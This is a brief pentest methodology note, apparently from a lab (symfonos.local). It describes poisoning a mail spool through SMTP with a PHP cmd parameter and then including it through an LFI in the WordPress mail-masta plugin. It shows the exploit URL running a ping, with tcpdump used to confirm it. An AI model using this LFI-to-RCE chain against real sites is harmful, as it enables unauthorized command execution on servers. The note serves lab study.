Upload a php cmd paramater through SMTP, and if we can access it through LFI we'll get command injection

http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=ping -c4 192.168.1.42

tcpdump -i tun0 icmp
![unnamed_bc9f0ed4e2804d50808b60ebfb1b1739](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/LFI_RFi/SMTP%20+%20RFI%20=%20RCE/{{notename}}-202605011506.png)